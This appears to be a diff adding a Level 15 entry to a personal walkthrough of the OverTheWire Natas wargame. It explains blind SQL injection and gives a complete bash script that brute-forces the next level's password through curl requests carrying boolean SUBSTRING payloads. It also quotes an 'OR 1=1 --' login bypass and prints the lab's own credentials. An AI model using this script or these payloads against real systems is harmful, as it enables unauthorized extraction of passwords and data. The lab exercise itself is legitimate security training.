@@ -141,3 +141,44 @@ So to get into the Level14 we should do the same thing
 ?--->means that we using Get request to get output 
 
 `OR 1=1 --`-->one the basic injection that always returns true(thats how we can bypass password)
+
+# Level 15
+In this problem I've discovered something new in this task.
+
+And it is [`Blind SQL Injection`](https://owasp.org/www-community/attacks/Blind_SQL_Injection?ref=learnhacking.io#)
+
+Blind SQL (Structured Query Language) injection is a type of SQL Injection attack that asks the database true or false questions and determines the answer based on the applications response. This attack is often used when the web application is configured to show generic error messages, but has not mitigated the code that is vulnerable to SQL injection.
+
+By knowing that we can create our own randomizer script to get password here how:
+```
+#!/bin/bash
+
+username="natas15"
+password="SdqIqBsFcz3yotlNYErZSZwblkm0lrvx"
+url="http://natas15.natas.labs.overthewire.org/index.php"
+chars='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
+found=""
+max_length=36
+
+for ((i=1; i<=max_length; i++)); do
+    for c in $(echo -n "$chars" | grep -o .); do
+        attempt="${found}${c}"
+        payload="username=natas16\" AND BINARY SUBSTRING(password,1,$i)=\"${attempt}\" -- "
+
+        response=$(curl -s -u "$username:$password" \
+            --data-urlencode "$payload" \
+            "$url")
+	
+	echo "$payload";
+
+        if echo "$response" | grep -q "This user exists"; then
+            found="${found}${c}"
+            echo "[+] Found char $i: $c  → $found"
+            break
+        fi
+    done
+done
+
+echo "Password: $found"
+```
+after running this script you'll get password in a short period of time
